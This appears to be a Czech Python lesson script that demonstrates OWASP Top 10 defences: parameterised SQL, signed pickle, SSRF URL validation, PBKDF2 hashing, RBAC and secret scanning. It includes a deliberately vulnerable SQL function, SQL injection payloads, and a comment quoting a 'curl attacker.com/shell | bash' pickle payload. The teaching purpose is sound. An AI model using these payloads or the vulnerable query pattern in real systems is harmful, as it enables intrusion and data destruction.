# Program — Lekce 117: Lekce 117 — Bezpečnost Python aplikací (OWASP Top 10)

Patří k lekci [Lekce 117 — Bezpečnost Python aplikací (OWASP Top 10)](../117_bezpecnost.md).

## Jak spustit

```bash
python3 programy/l117_bezpecnost.py
```

## Zdrojový kód

### `l117_bezpecnost.py`

```py
"""Lekce 117 — Bezpečnost: OWASP Top 10, SQL injection, pickle, SSRF, secret scanning."""
from __future__ import annotations

import hashlib
import hmac
import ipaddress
import json
import os
import pickle
import re
import secrets
import sqlite3
import time
from dataclasses import dataclass
from enum import Enum
from functools import wraps
from typing import Any, Callable
from urllib.parse import urlparse


# ── A03 — SQL Injection: ukázka útoku a obrana ───────────────────────────────

def setup_demo_db() -> sqlite3.Connection:
    """Vytvoří in-memory databázi s ukázkovými daty."""
    conn = sqlite3.connect(":memory:")
    conn.execute("""
        CREATE TABLE users (
            id INTEGER PRIMARY KEY,
            username TEXT NOT NULL,
            email TEXT NOT NULL,
            role TEXT DEFAULT 'user'
        )
    """)
    conn.executemany(
        "INSERT INTO users (username, email, role) VALUES (?, ?, ?)",
        [
            ("alice", "alice@example.com", "admin"),
            ("bob", "bob@example.com", "user"),
            ("carol", "carol@example.com", "user"),
        ],
    )
    conn.commit()
    return conn


def get_user_vulnerable(conn: sqlite3.Connection, username: str) -> list[tuple]:
    """
    ZRANITELNÁ funkce — SQL injection!
    NIKDY nepoužívejte f-stringy nebo % formátování pro SQL!
    """
    query = f"SELECT id, username, role FROM users WHERE username = '{username}'"
    try:
        return conn.execute(query).fetchall()
    except (sqlite3.OperationalError, sqlite3.Warning, sqlite3.DatabaseError):
        return []


def get_user_safe(conn: sqlite3.Connection, username: str) -> list[tuple]:
    """
    BEZPEČNÁ funkce — parametrizované dotazy.
    Driver automaticky escapuje všechny hodnoty.
    """
    return conn.execute(
        "SELECT id, username, role FROM users WHERE username = ?",
        (username,),
    ).fetchall()


def demonstrate_sql_injection(conn: sqlite3.Connection) -> None:
    """Ukázka SQL injection útoku vs. bezpečné obrany."""
    attacks = [
        ("' OR '1'='1", "Bypass autentizace — vrátí všechny uživatele"),
        ("alice' --", "Komentář — ignoruje zbytek dotazu"),
        ("'; DROP TABLE users; --", "Destruktivní dotaz (SQLite ignoruje ;, jiné DB ne)"),
        ("admin' UNION SELECT 1,username,role FROM users --", "UNION injection"),
    ]

    print("  SQL Injection demonstrace:")
    print(f"  {'Payload':45s} {'Vuln':6s} {'Safe':6s} {'Popis'}")
    print(f"  {'-'*85}")
    for payload, description in attacks:
        vuln_result = get_user_vulnerable(conn, payload)
        safe_result = get_user_safe(conn, payload)
        vuln_str = f"{len(vuln_result)} řádků" if vuln_result else "žádný"
        safe_str = f"{len(safe_result)} řádků" if safe_result else "žádný"
        print(f"  {payload[:43]:45s} {vuln_str:6s} {safe_str:6s} {description}")


# ── A08 — Pickle nebezpečí ────────────────────────────────────────────────────

class MaliciousPicklePayload:
    """
    Demonstrace pickle RCE (Remote Code Execution).
    __reduce__ umožňuje spustit libovolný kód při deserializaci!
    """
    def __reduce__(self) -> tuple:
        # V reálném útoku: os.system("curl attacker.com/shell | bash")
        # My jen simulujeme — netvoříme reálný RCE payload
        return (print, ("PICKLE RCE: Tento kód se spustil při loads()!",))


def demonstrate_pickle_danger() -> None:
    """Ukáže nebezpečí pickle a bezpečné alternativy."""
    print("\n  Pickle bezpečnostní riziko:")

    # Vytvoření "nebezpečného" payloadu
    safe_data = {"user": "alice", "role": "admin", "id": 1}
    safe_pickle = pickle.dumps(safe_data)
    print(f"  Normální pickle ({len(safe_pickle)} bytů): {safe_data}")

    # Nebezpečný payload
    malicious = pickle.dumps(MaliciousPicklePayload())
    print(f"  Malicious payload ({len(malicious)} bytů) — spustí kód při loads()!")
    print("  Výsledek pickle.loads(malicious_payload):")
    result = pickle.loads(malicious)  # Toto spustí print() — bezpečná demo verze

    print("\n  Bezpečná alternativa — JSON:")
    json_data = json.dumps(safe_data).encode()
    loaded = json.loads(json_data)
    print(f"  json.loads(): {loaded} (žádný spustitelný kód)")

    # HMAC podepsané pickle (pokud pickle nutně potřebujeme)
    print("\n  Podepsané pickle (HMAC-SHA256):")
    secret = os.urandom(32)
    payload, signature = _safe_pickle_dumps(safe_data, secret)
    print(f"  Signature: {signature.hex()[:32]}...")
    verified = _safe_pickle_loads(payload, signature, secret)
    print(f"  Ověřená data: {verified}")
    try:
        _safe_pickle_loads(payload, b"neplatny_podpis" * 2, secret)
    except ValueError as e:
        print(f"  Pozměněná data odmítnuta: {e}")


def _safe_pickle_dumps(data: object, secret: bytes) -> tuple[bytes, bytes]:
    payload = pickle.dumps(data)
    sig = hmac.new(secret, payload, hashlib.sha256).digest()
    return payload, sig


def _safe_pickle_loads(payload: bytes, signature: bytes, secret: bytes) -> object:
    expected = hmac.new(secret, payload, hashlib.sha256).digest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Neplatný HMAC podpis — data byla pozměněna nebo zfalšována!")
    return pickle.loads(payload)


# ── A10 — SSRF Prevence ───────────────────────────────────────────────────────

ALLOWED_SCHEMES = frozenset({"https", "http"})  # V prod pouze https
BLOCKED_HOSTS: frozenset[str] = frozenset({
    "localhost",
    "127.0.0.1",
    "0.0.0.0",
    "::1",
    "169.254.169.254",        # AWS EC2 metadata
    "metadata.google.internal",  # GCP metadata
    "100.100.100.200",         # Alibaba Cloud metadata
})
BLOCKED_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("fc00::/7"),
    ipaddress.ip_network("::1/128"),
]


def validate_url_safe(url: str) -> str:
    """
    Validuje URL pro bezpečný HTTP požadavek.
    Brání SSRF útokům.
    """
    parsed = urlparse(url)

    if not parsed.scheme:
        raise ValueError("URL musí obsahovat schéma (https://...)")

    if parsed.scheme not in ALLOWED_SCHEMES:
        raise ValueError(f"Nepovolen protokol: {parsed.scheme!r}")

    host = (parsed.hostname or "").lower()
    if not host:
        raise ValueError("URL musí mít hostname")

    if host in BLOCKED_HOSTS:
        raise ValueError(f"Blokovaný hostname: {host!r}")

    # Kontrola IP adres
    try:
        addr = ipaddress.ip_address(host)
        for network in BLOCKED_NETWORKS:
            if addr in network:
                raise ValueError(f"Blokovaná privátní IP adresa: {addr}")
        if addr.is_loopback:
            raise ValueError(f"Blokovaná loopback adresa: {addr}")
        if addr.is_link_local:
            raise ValueError(f"Blokovaná link-local adresa: {addr}")
    except ValueError as e:
        if "Blokovaná" in str(e):
            raise
        # Hostname (ne IP) — v produkci by se měla resolv a znovu zkontrolovat

    return url


def demonstrate_ssrf() -> None:
    """Demonstrace SSRF prevence."""
    print("\n  SSRF Prevence:")
    test_urls = [
        ("https://api.example.com/data", "Legitimní veřejné API"),
        ("http://localhost:8080/admin", "Lokální služba — blokováno"),
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata endpoint — BLOKOVÁNO!"),
        ("http://10.0.0.1/internal-api", "Privátní síť — blokováno"),
        ("http://192.168.1.1/admin", "Router — blokováno"),
        ("file:///etc/passwd", "File protocol — blokováno"),
        ("https://evil.com@trusted.com/path", "URL bypass pokus"),
        ("https://github.com/api", "Veřejné GitHub API"),
    ]

    for url, desc in test_urls:
        try:
            validate_url_safe(url)
            status = "POVOLENO"
        except ValueError as e:
            status = f"BLOKOVÁNO: {str(e)[:50]}"
        print(f"  {status:55s} | {url[:40]}")


# ── A02 — Kryptografie ────────────────────────────────────────────────────────

def hash_password_secure(password: str) -> str:
    """PBKDF2-HMAC-SHA256 — bezpečné hashování hesel (stdlib)."""
    salt = os.urandom(32)
    key = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 600_000, 32)
    return f"pbkdf2:sha256:600000:{salt.hex()}:{key.hex()}"


def verify_password(password: str, stored_hash: str) -> bool:
    """Bezpečné porovnání hesla — timing-safe."""
    try:
        _, algo, iters, salt_hex, key_hex = stored_hash.split(":")
        salt = bytes.fromhex(salt_hex)
        expected = bytes.fromhex(key_hex)
        actual = hashlib.pbkdf2_hmac(algo, password.encode(), salt, int(iters), 32)
        return hmac.compare_digest(actual, expected)
    except Exception:
        return False


def demonstrate_crypto() -> None:
    """Ukázka správné kryptografie."""
    print("\n  Bezpečná kryptografie:")

    # Srovnání hashů
    password = "MojeHeslo123!"
    weak_hash = hashlib.md5(password.encode()).hexdigest()
    sha1_hash = hashlib.sha1(password.encode()).hexdigest()
    secure_hash = hash_password_secure(password)

    print(f"  MD5  (ŠPATNĚ):    {weak_hash}")
    print(f"  SHA1 (ŠPATNĚ):    {sha1_hash}")
    print(f"  PBKDF2 (SPRÁVNĚ): {secure_hash[:60]}...")

    # Ověření
    correct = verify_password(password, secure_hash)
    wrong = verify_password("SpatneHeslo", secure_hash)
    print(f"  Ověření správného hesla: {correct}")
    print(f"  Ověření špatného hesla:  {wrong}")

    # Bezpečné tokeny
    print(f"\n  Bezpečné tokeny (secrets modul):")
    print(f"  token_urlsafe(32):  {secrets.token_urlsafe(32)}")
    print(f"  token_hex(16):      {secrets.token_hex(16)}")
    otp = "".join(str(secrets.randbelow(10)) for _ in range(6))
    print(f"  OTP (6 číslic):     {otp}")


# ── A01 — Broken Access Control ──────────────────────────────────────────────

class Role(Enum):
    ADMIN = "admin"
    USER = "user"
    READONLY = "readonly"


@dataclass
class User:
    id: str
    username: str
    role: Role


def require_role(*roles: Role) -> Callable:
    """RBAC dekorátor — kontrola oprávnění."""
    def decorator(func: Callable) -> Callable:
        @wraps(func)
        def wrapper(current_user: User, *args: Any, **kwargs: Any) -> Any:
            if current_user.role not in roles:
                raise PermissionError(
                    f"Nedostatečná oprávnění: {current_user.username!r} "
                    f"({current_user.role.value}) → {func.__name__!r} "
                    f"vyžaduje {[r.value for r in roles]}"
                )
            return func(current_user, *args, **kwargs)
        return wrapper
    return decorator


@require_role(Role.ADMIN)
def admin_delete_user(current_user: User, target_id: str) -> str:
    return f"Admin {current_user.username} smazal uživatele {target_id}"


@require_role(Role.ADMIN, Role.USER)
def update_profile(current_user: User, target_id: str, data: dict) -> str:
    if current_user.role != Role.ADMIN and current_user.id != target_id:
        raise PermissionError(f"Uživatel nemůže měnit cizí profil!")
    return f"Profil {target_id} aktualizován: {data}"


def demonstrate_access_control() -> None:
    """Demonstrace RBAC."""
    print("\n  Access Control (RBAC):")
    admin = User("1", "alice", Role.ADMIN)
    user = User("2", "bob", Role.USER)
    readonly = User("3", "carol", Role.READONLY)

    tests = [
        (admin_delete_user, admin, "3", "Admin maže uživatele"),
        (admin_delete_user, user, "3", "User zkouší smazat uživatele"),
        (update_profile, user, user.id, "User mění vlastní profil"),
        (update_profile, user, "1", "User zkouší měnit admin profil"),
        (update_profile, admin, "3", "Admin mění cizí profil"),
    ]

    for func, usr, target_id, desc in tests:
        try:
            if func.__name__ == "update_profile":
                result = func(usr, target_id, {"email": "new@example.com"})
            else:
                result = func(usr, target_id)
            print(f"  POVOLENO  [{usr.role.value:8s}] {desc}: {result}")
        except PermissionError as e:
            print(f"  ODMÍTNUTO [{usr.role.value:8s}] {desc}")


# ── Secret scanning (bandit-style) ────────────────────────────────────────────

SECRET_PATTERNS: list[tuple[str, str, int]] = [
    (r'(?i)(password|passwd)\s*=\s*["\'][^"\']{4,}["\']', "Hardkódované heslo", 8),
    (r'(?i)(secret_?key|api_?key|access_?key)\s*=\s*["\'][^"\']{4,}["\']', "Hardkódovaný klíč", 9),
    (r'(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36}', "GitHub PAT token", 10),
    (r'AKIA[0-9A-Z]{16}', "AWS Access Key ID", 10),
    (r'-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY', "Privátní klíč", 10),
    (r'(?i)Bearer\s+[A-Za-z0-9\-._~+/]{20,}', "Bearer token", 7),
    (r'(?i)sqlite:///(?!:memory:)\S{3,}', "SQLite soubor (ne in-memory)", 4),
    (r'(?i)http://[^/]*:(password|heslo|secret|pass)\d*@', "Heslo v HTTP URL", 8),
]


@dataclass
class SecretFinding:
    pattern_name: str
    severity: int
    line_number: int
    snippet: str


def scan_for_secrets(code: str) -> list[SecretFinding]:
    """Prohledá kód na potenciální úniky secretů."""
    findings: list[SecretFinding] = []
    lines = code.splitlines()

    for line_num, line in enumerate(lines, 1):
        # Přeskočí komentáře a docstringy pro snížení false positives
        stripped = line.strip()
        if stripped.startswith("#") or stripped.startswith('"""') or stripped.startswith("'''"):
            continue
        for pattern, name, severity in SECRET_PATTERNS:
            if re.search(pattern, line):
                findings.append(SecretFinding(
                    pattern_name=name,
                    severity=severity,
                    line_number=line_num,
                    snippet=line.strip()[:80],
                ))

    return findings


# ── Hlavní funkce ─────────────────────────────────────────────────────────────

def main() -> None:
    print("=" * 65)
    print("BEZPEČNOST PYTHON APLIKACÍ — OWASP TOP 10 DEMO")
    print("=" * 65)

    # --- 1. SQL Injection ---
    print("\n[A03] SQL Injection — parametrizované dotazy:")
    conn = setup_demo_db()
    demonstrate_sql_injection(conn)

    # --- 2. Pickle nebezpečí ---
    print("\n[A08] Pickle nebezpečí — JSON a HMAC podpis:")
    demonstrate_pickle_danger()

    # --- 3. SSRF prevence ---
    print("\n[A10] SSRF Prevence — validace URL:")
    demonstrate_ssrf()

    # --- 4. Kryptografie ---
    print("\n[A02] Kryptografie — PBKDF2 vs MD5/SHA1:")
    demonstrate_crypto()

    # --- 5. Access Control ---
    print("\n[A01] Broken Access Control — RBAC dekorátor:")
    demonstrate_access_control()

    # --- 6. Secret scanning ---
    print("\n[A05/A09] Secret scanning — detekce uniknutých secretů:")
    dirty_code = '''
password = "SuperHeslo123!"
api_key = "ghp_abc123def456ghi789jklmno0123456789xyz"
AWS_KEY = "AKIAIOSFODNN7EXAMPLE"
db_url = "sqlite:///production_data.db"
auth_header = "Bearer eyJhbGciOiJIUzI1NiJ9.payload.signature_here_long"
    '''
    clean_code = '''
import os
password = os.environ["DB_PASSWORD"]
api_key = os.environ.get("API_KEY")
db_url = "sqlite:///:memory:"
    '''

    for label, code in [("Nebezpečný kód", dirty_code), ("Bezpečný kód", clean_code)]:
        findings = scan_for_secrets(code)
        print(f"\n  {label}:")
        if findings:
            for f in findings:
                print(f"  [SEVERITY {f.severity:2d}] Řádek {f.line_number}: {f.pattern_name}")
                print(f"              → {f.snippet!r}")
        else:
            print("  Žádné problémy nenalezeny!")

    # --- 7. Timing attack prevence ---
    print("\n[A07] Timing attack prevence — hmac.compare_digest:")
    token_a = secrets.token_bytes(32)
    token_b = secrets.token_bytes(32)

    t1 = time.perf_counter_ns()
    result_unsafe = (token_a == token_b)  # Může unikat timing informace
    t2 = time.perf_counter_ns()
    result_safe = hmac.compare_digest(token_a, token_b)  # Konstantní čas
    t3 = time.perf_counter_ns()

    print(f"  == porovnání:              {t2-t1:5d} ns | výsledek: {result_unsafe}")
    print(f"  hmac.compare_digest:       {t3-t2:5d} ns | výsledek: {result_safe}")
    print("  Vždy používejte hmac.compare_digest pro bezpečnostně citlivá porovnání!")

    # --- 8. Shrnutí ---
    print("\n[SHRNUTÍ] OWASP Top 10 prevence v Pythonu:")
    mitigations = [
        ("A01 Access Control",    "RBAC dekorátor, ownership check"),
        ("A02 Crypto",            "PBKDF2/bcrypt/argon2, secrets.token_urlsafe()"),
        ("A03 Injection",         "Parametrizované dotazy (?), ORM"),
        ("A05 Misconfiguration",  "Validace konfigurace při startu"),
        ("A06 Závislosti",        "pip-audit, Dependabot, pravidelné aktualizace"),
        ("A07 Auth Failures",     "MFA, rate limiting, hmac.compare_digest"),
        ("A08 Data Integrity",    "JSON místo pickle, HMAC podpis dat"),
        ("A09 Logging Failures",  "Logovat bezp. události, ne citlivá data"),
        ("A10 SSRF",              "URL validace, whitelist, blocked networks"),
    ]
    for name, prevention in mitigations:
        print(f"  {name:25s}: {prevention}")


if __name__ == "__main__":
    main()

```
